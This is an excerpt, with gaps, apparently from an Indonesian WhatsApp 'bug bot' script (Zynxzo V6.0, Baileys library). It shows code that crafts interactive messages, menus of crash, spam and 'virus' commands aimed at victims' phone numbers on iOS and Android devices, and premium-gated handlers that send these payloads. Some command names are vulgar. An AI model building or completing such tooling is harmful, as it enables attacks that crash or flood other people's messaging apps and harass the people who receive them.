...
JIKA MELANGGAR LARANGAN YANG DI BERIKAN ZYNXZOO, YAUDH LAGIAN SC NYA HARUS MINTA KODE KE GW DLU
...
//
const zetAttack = ["http://telegra.ph/file/9a332c815ad31956d5ce6.jpg"]
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "http://telegra.ph/file/9a332c815ad31956d5ce6.jpg" } }, { upload: zynxzo.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
┏───────────────────⪩
│ 𝗢𝘄𝗻𝗲𝗿𝗻𝗮𝗺𝗲 : ${global.NamaOwner}
│ 𝗡𝗮𝗺𝗲𝗯𝗼𝘁 : ${global.namabot}
│ 𝗨𝘀𝗲𝗿 : ${isPremium ? 'Premium' : 'Free' }
│ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝗕𝗼𝘁 : Zynxzo V6.0
│ 𝗠𝗼𝗱𝗲 : Private
│ 𝗦𝘁𝗮𝘁𝘂𝘀 : Online
│ 𝗥𝘂𝗻 : ${runtime(process.uptime())}
╰┓ 𝗟𝗶𝗯𝗿𝗮𝘆 : Bailys - Socket
   ┗──────────────────⪩
┏───╴[ 𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐 ]╶──⪩
│것 ${prefix}ʙᴜɢᴍᴇɴᴜ
│것 ${prefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
...
╰┓ 𝗟𝗶𝗯𝗿𝗮𝘆 : Bailys - Socket
   ┗──────────────────⪩
┏───╴[ 𝘽𝙐𝙂 𝙑𝙄𝙋 ]╶────⪩
│것 ${prefix}ʙᴇᴛᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ɢʙᴡᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴡᴀᴏʀɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʙᴜsɪɴᴇss 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────⪩
┏───╴[ 𝘽𝙐𝙂 𝙄𝙊𝙎 ]╶────⪩
│것 ${prefix}ᴢʏɴxᴢᴏɪᴘʜᴏɴᴇ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ɪᴏsᴀᴛᴛᴀᴄᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴋɪʟʟɪᴏs 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────⪩
┏──╴[ 𝘽𝙐𝙂 𝘼𝙉𝘿𝙍𝙊 ]╶──⪩
│것 ${prefix}sᴀᴍsᴜɴɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴏᴘᴘᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴠɪᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ɪɴғɪɴɪx 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}xɪᴏᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʀᴇᴀʟᴍɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʟᴇɴᴏᴠᴏ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴍᴇɪᴢᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ɴᴏᴋɪᴀ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}sᴏɴʏ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʜᴅᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────⪩
┏───╴[ 𝘼𝙇𝙇 𝘽𝙐𝙂 ] ────⪩
│것 ${prefix}ʟᴏᴋᴀsɪ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʟᴏᴋᴀsɪ1 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʟᴏᴋᴀsɪ2 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʟᴏᴋᴀsɪ3 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴠɪʀᴜsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴠɪʀᴜsᴊɪᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴠɪʀᴀᴜᴅ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʟᴇᴍʙᴜ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴘʜɪʟɪᴘs 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ɢᴀsʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴘᴀɴᴀsᴏɴɪᴄ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────⪩
  ┏───────────────⪩
  │ 𝘾𝙧𝙚𝙖𝙩𝙤𝙧 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
  │ 𝙋𝙤𝙬𝙚𝙧𝙙 𝘽𝙮 : @𝙕𝙮𝙣𝙭𝙯𝙤
...
╰┓ 𝗟𝗶𝗯𝗿𝗮𝘆 : Bailys - Socket
   ┗──────────────────⪩
┏──╴[ 𝘽𝙐𝙂 𝘾𝙍𝘼𝙎𝙃 ]╶───⪩
│것 ${prefix}ᴢʏɴxᴢᴏᴄʀᴀsʜ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ʙᴜɢᴄʀᴀsʜ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏʟᴏᴄᴠɪʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏᴠɪʀᴜs 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏsʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏᴍᴏᴅs 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏᴄʟᴇᴀʀ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴋɪʟʟᴡʜᴀɴɢsᴀғғ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴠɪʀᴜssʟᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴢʏɴxᴢᴏᴀᴜᴛᴏᴄʀᴏᴛ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴍᴀᴍᴘᴜsᴄ1 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}ᴄ1ᴅᴇᴋ 𝟲𝟮𝟴𝗫𝗫𝗫
┗─────────────────⪩
┏───╴[ 𝘽𝙐𝙂 𝙎𝙋𝘼𝙈 ]╶──⪩
│것 ${prefix}sᴘᴀᴍʙᴜɢ 𝟲𝟮𝟴𝗫𝗫𝗫
│것 ${prefix}sᴘᴀᴍɴᴏᴛɪғ 𝟲𝟮𝟴𝗫𝗫𝗫 
│것 ${prefix}sᴘᴀᴍᴜɪ 𝟲𝟮𝟴𝗫𝗫𝗫
┗────────────────⪩
┏───╴[ 𝘽𝙐𝙂 𝙋𝙍𝙄𝘽 ]╶───⪩
│것 ${prefix}ᴋᴏɴᴛᴏʟ 𝗧𝗶𝗺𝗲
│것 ${prefix}ʙᴀᴄᴏᴛ 𝗧𝗶𝗺𝗲
│것 ${prefix}ᴍᴀs? 𝗧𝗶𝗺𝗲
│것 ${prefix}ʜᴇᴍ 𝗧𝗶𝗺𝗲
│것 ${prefix}=. 𝗧𝗶𝗺𝗲
...
MINAT? : Chat Contact Developer Script`)
taskdone(finishmoji)
}
break
//=================================================//
...
if (!isDeveloper) return 
if (!args[0]) return zreply(`Penggunaan ${prefix+command} nomor\n━──────‹›──────━\nContoh:\n ${prefix+command} 62888888`)
...
break
//  乂─━━━━━━━━━━━━━━━━━━━─乂  //
case 'kontol': case '=.': case 'mas?': case 'hem': case 'bacot': case '🤨': case '😱': case '💩': case'👻': case '🐊':{
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
inireact(randomemoji)
if (!isPremium) return
...
break
//  乂─━━━━━━━━━━━━━━━━━━━─乂  //
case 'zynxzoc1': case 'lokasi': case 'lokasi1': case 'lokasi2': case 'lokasi3': case 'virusbug': case 'virusjid': case 'viraud': case 'lembu': case 'philips': case 'gasbug': case 'panasonic': case '🔥': case '😂': case '🥶': case '🦖': case '☠️': case '😖': case '🥴': case '💦': case '🤯': case '🖕': {
darkphonk = fs.readFileSync('./media/audio/dead.mp3')
if (!isPremium) return zreply(mess.premium)
if (!q) return zreply(`Penggunaan .${command} 628xxx`)
...
await sleep(2000)
//Sending Audio
    zynxzosendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: zets })
taskdone(finishmoji)
}
break
